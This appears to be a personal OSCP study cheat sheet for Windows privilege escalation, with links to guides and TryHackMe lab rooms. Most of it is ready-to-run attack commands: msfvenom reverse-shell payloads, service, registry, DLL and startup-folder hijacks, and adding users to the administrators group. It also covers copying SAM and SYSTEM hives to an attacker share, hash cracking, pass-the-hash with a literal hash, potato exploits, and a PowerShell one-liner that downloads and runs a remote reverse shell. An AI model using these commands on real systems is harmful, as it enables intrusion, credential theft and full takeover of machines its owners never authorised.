#TTY escape:- https://netsec.ws/?p=337
     - python -c 'import pty; pty.spawn("/bin/sh")'

https://github.com/Esot3riC/OSCP-prep/blob/main/PrivilegeEscalation/Windows/001%20Windows-Privilege-Escalation-Light.pdf

https://github.com/Esot3riC/OSCP-prep/blob/main/PrivilegeEscalation/Windows/001%20Windows-Privilege-Escalation.pdf

PDF On Gmail Subject:- OSCP Privilege escalation PDF

#rdesktop to login GUI in window machine > rdesktop 10.10.10.10 %g 95 (if we get credSSP error then use)
        xfreerdp(negotiate for us) > xfreerdp /u:username /v:10.10.10.10.:3389 (focus more on port number) enter password. it is also GUI.
        open internet explore as system(administrator) then go to settings > files > saveas> search for "C:\windows\syatem32\*.* (press enter)" > search for cmd.ex > write click > open it > and you have admin access.

Dir /R (to see hidden files data stream for e.g $DATA )

# Important Links:---
           001 Fuzzy-Security-Guide
          https://www.fuzzysecurity.com/tutorials/16.html

          002 PayloadsAllTheThings-Guide
          https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

          002 Absolombs-Guide
          https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

          002 Sushant-747s-Guide
          https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html

          https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources

          https://book.hacktricks.xyz/exploiting/windows-exploiting-basic-guide-oscp-lvl
          https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters

# file transfer: certutil -urlcache -f http://10.0.0.0/ms.exe ms.exe (same as wget for linux)

   using ftp we can easy take files from victim"
          - start ftp server: python -m pyftpdlib -p 21 --write
          - connect victim: ftp 10.10.10.10 (anonymous login)
                            - put put file.ext


# smb file share:- server start command
sudo /usr/bin/python3 /home/maddy/OSCP/2privilegeesclation/Window/smbserver.py tools .
File share from attacker: systeminfo > \\192.168.43.97\tools\systeminfo.txt
file share from victim(run on victim side)  copy C:\PrivEsc \\192.168.43.97\tools\winPEASany.exe
                                           c:\Temp> copy \\192.168.43.97\tools

first what user and group you are: whoami


# Techniqe To Swaping Root Shell:-----
    1. msfvenom:- if we run command with admin Privilege. it work perfactly.
           1.1 msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPOST= -f exe -o reverse.exe
                use NETCAT or multi/handlre to caught reverse shell.

    2 RDP:- if enable or we have to enable it. we can add low Privilege user in admin gropup
                > net localgroup administrators <username> /add

    3 Admin -> SYSTEM:- To escalate from an admin user to full SYSTEM privileges, you can use the
               PsExec tool from Windows Sysinternals https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
                > .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe            
            

 # Tools:----------

      -Executables:-- winPEAS.exe, Seatbelt.exe(complie), Watson.exe(C), SharpUp.exe(C) 
      -PowerShell:-- Sherlock.ps1(looks for common vulnerablities), PowerUp.ps1, jaws-enum.ps1
      -Other:-- Window-exploit-Suggester.py(attacker machine), Exploit Suggester Metasploitable

      -check we can run powershell:-- powershell -ep bypass 
      - use powerup or windows-exploit-Suggester if winPEAS or powershell not work

        0. winPEAS: main tool (hunts for privilege escalation misconfigurations and highlights them) .Net >= 4.5 is required if not then try to run bat file.
           https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
           - Before running, we need to add a registry key and then reopen the command prompt:
                > reg add HKCU\Console /v VirtualTerminalLevel/t REG_DWORD /d 1 (for colours)
           - > .\winPEASany.exe quiet cmd fast 
           - check .net version running
           https://www.windowscentral.com/how-quickly-check-net-framework-version-windows-10

        1. PowerUp: (written in power shell) use full if powershell is not availaible 
            https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 
            - >powershell -exec bypass (to run powerup we need power shell session)
            - PS> . .\PowerUp.ps1 (To run PowerUp, use dot sourcing to load the script)   
            - PS> Invoke-AllChecks (Run the Invoke-AllChecks function to start checking for privilege escalation misconfigurations)

        2. SharpUp: (C sharp)
            Code:- https://github.com/GhostPack/SharpUp
            Pre-compiled:- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe  
            - ./sharpup.exe 

        3. Seatbelt: (enumeration tool, not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.)  
            Code: https://github.com/GhostPack/Seatbelt
            Pre-Compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe 

        4. accesschk.exe: for checking user access control rights. use to check that user or group has access to files, directories, services, and registry keys.

        5. (important manual checklist) 
            https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

        6. secretdump.py:--- https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py

#system Enumuration:--- - systeminfo
                        - hostname
                        - wmic qfe (when last patched) wmic qfe get Caption,Description etc.
                        - wmic logicaldisk (drives in system) wmic logicaldisk get Caption,Description etc.
                        - cmdkey /list: look for stored credentials on machine 

#User and group Enumuration:--- whoami, whoami /priv
                              - whoami /gropus
                              - net user (users on the machine) net user user(or name)
                              - net localgroup (net localgroup administrator) help to check the number of person in group

#Network Enumuration:---  - ipconfig, ipconfig /all
                          - arp -a (arp table)
                          - route print
                          - netstat -ano (check using ports)                                

#AV and firewall Enumuration:--- sc query windefend (by default defender installed in window machine)
                        - sc queryex type= service (all service running on machine) -check their for antivirus
                        - netsh firewall show state
                        - netsh advfirewall firewall dump
                        - netsh firewall show config 


--------------------------------------------------------------
Exploits
--------------------------------------------------------------

1 Kernel Exploits:--
              $:- > whoami and > net user <username> (check you are member fo which group)
              $:- > systeminfo (enumurate windowsversion / patch level )             
                   -systeminfo > \\192.179.43.97\maddy\systeminfo.txt (transfer it to  kali SMB server on attacker machine)
              $:- find matching exploits (google, exoloitdb, github or use below mentioned scripts)
                     Windows Exploit Suggester: https://github.com/bitsadmin/wesng
                                                https://github.com/AonCyberLabs/Windows-Exploit-Suggester
                    Watson(Latest enumurate kernel exploits): https://github.com/rasta-mouse/Watson 
              $:- python wes.py /file/systeminfo.txt -i 'Elevate of privilege' --exploit-only | more (run exploit on >systeminfo command output)
              $:-https://github.com/SecWiki/windows-kernel-exploits (Precompiled Kernel Exploits found in this link)
              $:- transfer the exploit to victim machine 

2 services:---  First check, can we stop/start the service.(tp prevent rabbit hole).  restart whole machine  $accesschk.exe$
              $:- > sc.exe qc <name> (Query the configuration of a service)
              $:- > sc.exe query <name> (Query the current status of a service)
              $:- > sc.exe config <name> <option>= <value> (Modify a configuration option of a service)
              $:- > net start/stop <name> (Start/Stop a service) or sc start <service_name>
              $:- >
              $:- >

           
           2.1  Insecure Service Permissions:--- Each service has ACL which define service-specific permissions.
                                                 - SERVICE_QUERY_CONFIG & SERVICE_QUERY_STATUS (Normal permissions)
                                                 - SERVICE_STOP & SERVICE_START (Usefull can use for exploit)
                                                 - SERVICE_CHANGE_CONFIG & SERVICE_ALL_ACCESS (Dangerous Permissions)
              $:- if user has permission to change the configuration of a service which run with SYSTEM privileges, we can change executable. (check can we start and stop the service)
              $:- > .\winPEASany.exe quiet serviceinfo (only enumurate service)
              $:- > .\accesschk.exe /accepteula -uwcqv user daclsvc(service name) (use accesschk to check permission related with service)
              $:- > sc qc <service name> (query service configuration to check:- start type = DEmand_start means we need to manually start the service, Binary_PATH_NAME, SERVICE_START_NAME= Permission) 
              $:- > sc.exe query <name> (Query the current status of a service)
              $:- > sc config service_name binpath= "\"c:\PrivEsc\reverseshell.exe\"" (replace the binary path to reverseshell of service, because we have config permission)
              $:- > net start service_name (statr the service) or sc start <service_name>
              $:- get reverse shell on attachker machine.

                                                   or

           2.0 Service escalation: Bin Path:- add new administrator user
              $:- > powershell -exec bypass (start powershell)
              $:- > . .\PowerUp.ps1    > Invoke-AllChecks (run power up tool)
              $:- > accesschk64.exe -uwcv Everyone * (check which service has write access, Everyone = Groupname)
              $:- > accesschk64.exe -uwcv daclscv (service name found in above script) 
              $:- > sc qc daclscv (query the service where we get binary path to exploit)
              $:- > sc config daclscv binpath= "net localgroup administrators user /add" (add new user)
              $:- > sc start daclscv (again start service)
              $:- > now the binary path don't have any service to execute wo user creation comaand is start.

           2.2 Unquoted Service Path:--- space between Path some executable tale arguments seprated by space e.g. program.exe arg1 arg2 arg3. this behaviour leads to attack.
              $:- if we can write to the location befor window check for final.exe file. 
              $:- > .\winPEASany.exe quiet serviceinfo (only enumurate service) 
              $:- > sc qc <service name> (confirm binary path contain spaces) (for e.g. c:\Program files\file1 path\file2 path\service.exe)
              $:- now we need to add revershell.exe in the path like file.exe or file2.exe in any path
              $:- > .\accesschk.exe /accepteula -uwcqv user daclsvc(service name) (use accesschk to check permission related with service)
              $:- > .\accesschk.exe /accepteula -uwdq C:\ (check that we have write perminnion in any folder)
              $:- > .\accesschk.exe /accepteula -uwdq "C:\Program files"
              $:- > .\accesschk.exe /accepteula -uwdq "c:\Program files\file1 path" (if output contains username then we have permission to write in the folder)
              $:- create a reverse shell file2.exe amd keep in "c:\Program files\file1 path" folder
              $:- or copy the shell > copy reverse.exe "c:\Program files\file1 path\file2.exe" 
              $:- > net start service_name (statr the service) or sc start <service_name>
              $:- get reverse shell on attachker machine create listner.  

           2.3  Weak Registry Permissions:--- registry store entry for each service. check we can edit registry or not.
              $:- > .\winPEASany.exe quiet serviceinfo (only enumurate service check registry related)
              $:- > powershell -exec bypass (start powershell)
              $:- > Get-Acl HKLM:\System\CurrentControlSet\Services\regscv | Format-List (verify permission ANTYAUTHORITY\INTRACTIVE has full access)
              $:- > .\accesschk.exe /accepteula -uwdqv HKLM\System\CurrentControlSet\Services\regscv (verify perminnion usig accesschk)
              $:- > .\accesschk.exe /accepteula -uwcqv user regscv (confirm that we can start the service)
              $:- > reg query HKLM\System\CurrentControlSet\Services\regscv (check current values in service registry entry)
              $:- > reg add HKLM\System\CurrentControlSet\Services\regscv  /v ImagePath /t REG_EXPAND_SZ /d C:\ PrivEsc\reverse.ese /f (change the inamge path found in abuve command: <reg query> )
              $:- create listner in attacjker machine
              $:- > net start regscv (start service)  or sc start <service_name>


           2.4  Insecure Service Executables:--- If the original service executable (.exe file) is modifiable by us, we can simply replace it  with reverse shell.
              $:- > .\winPEASany.exe quiet serviceinfo (only enumurate service check registry related-look filepermsvc file)
              $:- > .\accesschk.exe /accepteula -quvw "c:\Program files\file1 path\file2.exe" (check permission)
              $:- > .\accesschk.exe /accepteula -uwcqv user filepermsvc(service_name) (confirm that we can start the service)
              $:- > copy "c:\Program files\file1 path\file2.exe" C:\temp (copy-backup the original file to any location)
              $:- > copy \Y C:\PrivEsc\reverese.exe "c:\Program files\file1 path\file2.exe"
              $:- create listner in attacjker machine
              $:- > net start regscv (start service)
              
           2.5  DLL Hijacking:--- services will load functanalities from a library called DLL. if DLL is loaded with absolute path, it might be possible to esclate.
                             :-- If a DLL is missing from the sysytem and user has write access to the directoru within the path that window search for DLL. 
           use procmon to find attackeable dll. check a path where dll does not exist and writable. 
              $:- > .\winPEASany.exe quiet serviceinfo (only enumurate service check registry related-look DLL) 
              $:- chelk all the srevices reported and vulnerable to DLL attack. and we can start and stop it.
              $:- > .\accesschk.exe /accepteula -uwcqv user dllsvc (check access/permissions)
              $:- > sc qc dllsvc (check details of dllsvc service)
              $:- copy the file mentioned in Binary_PATH_NAME. to our machine where we have admin rights and PROCMON tool installed (wondow and install procmon also)
              $:- run procmnon as administrator. stop nad clear current capture. press ctrl+L to open filter configuration 
                  (process name dllhijacksvc.exe). deselect show registry activity and show network activity. start capture again.
              $:- > net srart dllsvc (on attacer window10 start the service)
              $:- In Procmon check all the DLL with name not found result (look for the directory where we have write permission: C:
              Temp)
              $:- msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT -f dll -o hijackme.dll
              $:- > copy \\192.168.0.1\tools\hijackme.dll C:\Temp (copy the vulnerable file)
              $:- create listner on linux
              $:- > net stop dllsvc (stop dll service)
              $:- > net start dllsvc (start dll service)  or sc start <service_name>

           2.6  Service Escalation - Executable Files :- services running that has executable (.exe) attached to them 
           1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service" (check files with accesschk tool but powerup is best) if we know what the service then use accesschk. need c script - create a user.
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.
                https://tryhackme.com/room/windowsprivescarena   (Task 6)
 

3 Registry Exploits:--- 
           
           3.1 AutoRuns:- when window start it automatically run commands with high privileges called AutoRuns. these AutoRuns are
            configure in registry. if we are able to write an Autorun executable and able to restart the system then we can ecslate privilege. 
              $:- first check that can we restart the system or know in advance that system will restart.
              $:- > .\winPEASany.exe quiet applicationinfo (check for autorun) 
              $:- > reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
              $:- > .\accesschk.exe /accepteula -wvu "c:\program\path\exploit.exe"
              $:- > copy "c:\program\path\exploit.exe" C:\temp (copy-backup the original file to any location)
              $:- > copy \Y C:\PrivEsc\reverese.exe "c:\program\path\exploit.exe"
              $:- > restart the machine 
              $:- > create listner on linux and get the access. we get permission on user which was last login to the machine

           
           3.2 AlwaysInstallElevated:--- .MSI files are package files used to install applications. these run with the permission user trying to install them. some time window allow these install to run as admin privilege then .msi file is malicious here (replace with reverseshell)
              $:- two Registry settings must be enabled for this to work
                     -The “AlwaysInstallElevated” value must be set to 1 for both the local machine:
                                HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
                       and the current user:
                                 HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer (if missing or disable exploit not work)
              $:- > .\winPEASany.exe quiet windowcreds (check AlwaysInstallElevated )                                  
              $:- > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated (machine)
              $:- > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated (user)
              $:- msfvenom -p window/x64/shell_reverse_tcp LHOST= LPORT -f msi -o reverse.msi
              $:- create listner in kali
              $:- > copy \\192.168.0.1\tools\reverse.msi (copy reverse shell to victim machine)
              $:- > msiexec /quiet /qn /i reverse.msi (run command in same folder where is the reverse.msi)

                                       or add user(GUI)


              $:- > reg query HKLM\Software\Policies\Microsoft\Windows\Installer (Open command prompt and type-check above)
              $:- > reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
              $:- From the output, notice that “AlwaysInstallElevated” value is 1.
              $:- > powershell -exec bypass (start powershell)
              $:- > . .\PowerUp.ps1    > Invoke-AllChecks (run power up tool, here you find abuse function to add user of “AlwaysInstallElevated”)
              $:- > Write-UserAddMSI (this command will create useadd.msi (executable)file in Poweup tool folder)
              $:- > net localgroup administrator (confirm number of users in administrator group)
              $:- run the useadd.msi (executable)file and it give pop-up to ask the usernme and password we want to add in admin group.
              $:- > net localgroup administrator (new malicious user added to the admin group) 
              $:- > getuid 
               
                4. net localgroup administrator
                 https://tryhackme.com/room/windowsprivescarena   (Task 4)

           3.3 Service Escalation - Registry key (if we have full control over registry key) so we are able to add malicious exe in registry. 
              $:- >  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl (run in powershell)
              $:- the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.  
              $:- > reg query HKLM\System\CurrentControlSet\Services\regscv (check current values in service registry entry)
              $:- Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM using ftp
              $:- on kali machine Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add 
              $:- x86_64-w64-mingw32-gcc windows_service.c -o x.exe (complie edited service.c file) (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64')
              $:- transfer x.exe, to the Windows VM (store in temp folder)
              $:- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f (run in powershell)
              $:- sc start regsvc (start Registry service)
              $:- net localgroup administrators (confirm user added)     
                 https://tryhackme.com/room/windowsprivescarena   (Task 5)
           

4 Passwords:---  administrators re-use their passwords, leave pass in readable locations.
           4.0 Configuration Files:-- administrators will leave configurations files on the system with passwords in them.
                   - run these commands in directories to search for password
              $:- > dir /s *pass* == *.config (search for file in current directory for world *pass*)
              $:- > findstr /si password *.xml *.ini *.txt *.config (search for content in file in current directory)
              $:- > .\winpeasany.exe quiet cmd searchfast filesinfo (credentails)
              $:- > type C:\windows\path\credentils.xml (check passwords in the file)
              $:- 
              $:- run these commandas in home, temp, sespicious program directory, check wi-fi password 
           
           4.1 Registry:- windows store passwords in registry. Programs store configuration options in window registry.
              $:- > reg query HKLM /f password /t REG_SZ /s (full machine's registry search for keyword password)
              $:- > reg query HKCU /f password /t REG_SZ /s
              $:- > .\winpeasany.exe quiet filesinfo userinfo (search for Autologon credentails, putty sessions)
              $:- We can verify winpeasany result manually:
              $:- > reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" ( Autologon credentails)
              $:- > reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s (putty sessions)
              $:- On Kali, we can use the winexe command to spawn a shell using these credentials:  
              $:- # winexe -U 'admin%password123' --system //192.168.1.22 cmd.exe
              $:- # winexe -U 'admin%password123' //192.168.1.22 cmd.exe

           
           4.2 Saved Creds:-- runas command  allows users to run commands with the privileges of other users. may requires other user’s password
           However, Windows allows users to save their credentials on system, and these saved credentials can be used to bypass this requirement.
              $:- > .\winpeasany.exe quiet cmd windowscreds (check for stored credentails)           
              $:- > cmdkey /list (command to check saved credentials)
           
           - If the saved credentials aren’t present, run the following script to refresh the credential:
           > C:\PrivEsc\savecred.bat
           
              $:- > create a listner on linux           
              $:- > runas /savecred /user:admin C:\PrivEsc\reverse.exe (use the saved credential to run any (reverse.exe) malicious command store in system as the admin to get reverse shell)

          
           4.3 SAM:- Windows stores password hashes in the Security Account Manager (SAM). the hashes are encrypted with a key which can be found inthe file name SYSTEM. if we have ability to read the SAM and SYSTEM file, we can extract hashes. (check ppt)
              $:- SAM and SYSTEM file found in the one of the following locations:- 
                   - C:\Windows\Syatem32\config
                   - C:\Windows\Repair
                   - C:\Windows\Syatem32\config\RegBack
              $:- > copy C:\Windows\Repair\SAM \\192.168.0.1\Tools (copy Sam file to kali machine)
              $:- > copy C:\Windows\Repair\SYSTEM \\192.168.0.1\Tools (copy Sam file to kali machine)  
              $:- git clone https://github.com/CiscoCXSecurity/creddump7.git (install PW dump tool in kali)
              $:- python2 pwdump.py /tools/SYSTEM /tools/SAM (dump hashes of all user in SAM file)
              $:- 1st part of the hash is LM hash, 2nd part of the hash is NTLM hash. hash start with 31 means no password or disabled
              $:- hashcat -m 1000 --force (2nd part of the hash) /usr/share/wordlists/rockyou.txt
              $:- winexe -U 'admin%password123' //192.168.1.22 cmd.exe (get a shell, winexe is already installed in kali)

           4.4 Passing the Hash:- Windows accepts hashes instead of passwords to authenticate to a number of services called passing the hash.
             - if we have hash of password. we can use tool pth-winexe to get root. it is modified version of winexe 
             $:- SAM and SYSTEM file found in the one of the following locations:- 
                   - C:\Windows\Syatem32\config
                   - C:\Windows\Repair
                   - C:\Windows\Syatem32\config\RegBack
              $:- > copy C:\Windows\Repair\SAM \\192.168.0.1\Tools (copy Sam file to kali machine)
              $:- > copy C:\Windows\Repair\SYSTEM \\192.168.0.1\Tools (copy Sam file to kali machine)  
              $:- git clone https://github.com/CiscoCXSecurity/creddump7.git (install PW dump tool in kali)
              $:- python2 pwdump.py /tools/SYSTEM /tools/SAM (dump hashes of all user in SAM file)
              $:- pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe
              $:- pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.1.22 cmd.exe


5 Scheduled Tasks:---  same as cron job in linux. run with the privilege of the user who create them. sometime we need to rely on clues,
such as finding a script or log files that indicates a scheduled tsak is being run.  
             $:-> schtasks /query /fo LIST /v (List all scheduled tasks your user can see)
             $:- > PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State (In PowerShell)
             $:- we have to manually searchfor scripts, ps1(powershell script) etc.
             $:- > type powershellScript.ps1 (read the contents of script)
             $:- > accesscheck.exe /accepteula -quv user powershellScript.ps1 (check permissions on the script - Append data)
             $:- nc -lvp 4444  (atart listner on kali linux)
             $:- > copy powershellScript.ps1 C:\Temp\ (backup the original script)
             $:- > echo C:\PrivEsc\reverseshell.exe >> powershellScript.ps1 (append script to powershell script)
             $:- the script automatically run by schedule task. will get the reverse shell later.
             $:- whoami

6 Insecure GUI Apps:--- users could be granted to run certain GUI apps with administrator privileges   
      Since the parent process is running with administrator privileges, spawned command prompt will also run with these privileges.
             $:- > tasklist /V | findstr mspaint.exe (check the mspaint.exe running with admin priviledge) 
             $:- open MSpaint and > file > open > file//C:/windows/system32/cmd.exe (this will give admin shell)
          

7 Startup Apps:-- user can define apps that start when they login, by placing them in a specific directore. Windows also has a startup directory(called startup) for apps that should start for all users.when any user login this app start automatically with his privilege if we can create files in the directory we use our reverseshell here. if we have access
             $:- C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp (startup file location)
             $:- .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" (check permissions on the StartUp directory)
             $:- icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (icacls.exe main tool used for this, installed in windows)
                    (output notice that the “BUILTIN\Users” group has full access ‘(F)’ )
             $:- Create a file CreateShortcut.vbs
                     Set oWS = WScript.CreateObject("WScript.Shell")
                     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
                     Set oLink = oWS.CreateShortcut(sLinkFile)
                     oLink.TargetPath = "C:\PrivEsc\reverse.exe"
                     oLink.Save
             $:- > cscript CreateShortcut.vbs (Run the script using cscript)
             $:- nc -lvp 444 (clear listner on kali)
             $:- now logout and login to the windows (check we have access to restart the machine)
             $:- whoami                      

                -https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
                  - add the malicoius file in startup folder and wait for admi nto login to the machine      

8 Installed Applications:-- 
             $:- go to exploit db website and set filter (local, windows, has app, priv esc (search box)) 
             $:- > tasklist /v (Manually check/enumerate all running programs)
             $:- > .\seatbelt.exe NonstandardProcesses (We can also use Seatbelt to search for nonstandard processes)
             $:- > .\winPEASany.exe quiet procesinfo (winPEAS also has this ability (note the misspelling)) 
             $:- Once you find an interesting process try to identify its version. /? or -h
             $:- serach in exploit db for attackes related to the vulnerable application (some exploits contain instruction and other are full program that we need to compile and run on the system)                 
                                     
                    -                     - 
# token Impersonation(potato attacks):-- use other users token for Privilege Escalation
             tooken is cookie for computer. temporary keys allow access to system/Network without credentials.
             2 type: 1. delegate(login to machine or RDP=bad) and 2. impersonate(non-interactive, attaching a netwokk drive or domain logon script).  
             $:- > list_tokens -u (check any token availaible) 
             $:- > whoami /priv output = ((output = SeImpersonatePrivilege       enabled)) (check privilege)
                                         (SeAssignPrimaryToken)           
             $:- https://github.com/gtworek/Priv2Admin (list all the type of priviledge)
             $:- https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ (potato attack explained) 


9 Hot Potato:--  attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts. it uses a spoofing attack along with NTLM relay attack to gain SYSTEM privilege. this attack tricks window to authenticating as the SYSTEM user to a fake HTTP server using NTLM. 
             $:- transfer hotptato.exe in victim machine and run command 
             $:- nc -lvp 4444 (create a listner in kali)  
             $:- > .\potato.exe -ip 192.168.1.33(victim machine ip) -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true (use the IP of victim machine in command)
                   

10. Rotten Potato > Juicy Potato (Service Accounts):-- 
             Service accounts can be given special privileges to run their services, we cannot be login directly to the service account unlike other user accounts. 
             service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user. this is possible because service accounts have "SeImpersonatePrivilege" enabled.
             $:- > whoami /priv (check my privileges) ((output = SeImpersonatePrivilege       enabled))
             $:- nc -lvp 53 (only port 53 start listner in kali)
             $:- C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
                  important points relate with above script
                     - port 1337 must be availaible
                     - CLSID (-c) must be valid for the version of the window we are using
                     - If the CLSID ({03ca…) doesn’t work for you, either check this list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
                     -or run the GetCLSID.ps1 PowerShell script.
              $:- whoami 
              $:- more < hm.txt:root.txt:$DATA (see content in the file) 
              $:- https://github.com/ohpe/juicy-potato (Juicy-Potato-Github)
              $:- https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 (Groovy-Reverse-Shell)
              $:- https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/ (Alternate-Data-Streams)



             - i have to be a local service user
             > whoami (output= nt\ authority\local service
             - then check for privilege i have
             whoami /priv  (output = SeImpersonatePrivilege       enabled)
             - then run juicy patato exploit
             > C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
            - confirm that port number should be availaible and -c (CLSID) must be valid for the window version we are using
             
11. port forwarding :-- check video https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html (it is same as putty but its on command line) Plink.exe tool used in window for it.
             $:- Transfer the plink to the victim device.
             $:- apt install ssh 
             $:- gedit /etc/ssh/sshd_config - update attacker's kali SSH configuration file:- 
                 permitRoolLogin yes  (remove # and add yes)
             $:- service ssh start/restart  
             $:- plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.10.10 (use plink in victim machine)
                 -R= posr forwarding
                 -use wimexe to login
             $:- winexe -U Administrator(username)%Password! //127.0.0.1 "cmd.exe"
             $:- whoami

12. Window subsystem for linux(WSL):- allow run linux on windows.

             $:- > where /R C:\window bash.exe (find bash.exe in window)
             $:- > where /R C:\window wsl.exe (find wsl.exe in window)
             $:- > wsl whoami (check who am i)  or Full/PAth/wsl.exe whoami
             $:- > wsl python -c 'bind or reverse shell code'  
            if we get tty related errror try link: https://netsec.ws/?p=337 


-PsExec is a light-weight telnet-replacement that lets you execute processes on other systems
# https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py    
-usage:- https://kavishgr.gitbook.io/kavishgour/windows/psexec.py    
Impacket: https://github.com/SecureAuthCorp/impacket     
                            
DATA streams:-(hiden files/information) https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/#:~:text=Alternate%20Data%20Streams%20(ADS)%20are,text%20inside%20the%20text%20file.
              -dir /R
              -more < paste data
              - tool $stream$ by sysinternals

13 RunAs command:-- allow us to run commands as some once else 
                    https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)
             $:- > cmdkey /list (look for stored credentials on machine) 
             $:- to use those credentialwe have a default tool RunAs in windows 
             $:- > C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe" /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\User\securiy\root.txt
             $:- > dir (root.txt present in security folder)
             $:- > 
14 CVE-E9-1388:- https://www.youtube.com/watch?v=3BQKpPNlTSo 
                 https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388/
            $:- xfreerdp(negotiate for us) > xfreerdp /u:username /v:10.10.10.10.:3389 (focus more on port number) enter password. it is also GUI.
             $:- vulnerability exists in the Windows Certificate Dialog when it does not properly enforce user privilege
             $:- open the hhupd.exe file with run as administrator (https://github.com/jas502n/CVE-2019-1388)
             $:- it will show certificate reated details and we need to open internet explorer form that details. 
             $:- open internet explore as system(administrator) then go to settings > files > saveas> search for "C:\windows\syatem32\*.* (press enter)" > search for cmd.ex > write click > open it > and you have admin access.
             $:- *.* is used for show all files

Dir /R (to see hidden files data stream for e.g $DATA )

PowerShell reverseshell:----
run command in victim machine:----- (jenkins server)
power iex (New-Object Net.WebClient).DownloadString(http://IP:PORT/Invoke-PowerShellTcp.ps1);Invoke-PowerShellTcp -Reverse IP -Port PORT
host the below script and open listner: 
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  (Invoke-PowerShellTcp.ps1)
Incognito (search for it )

#autorun.exe 

Mount to mount VHD
https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
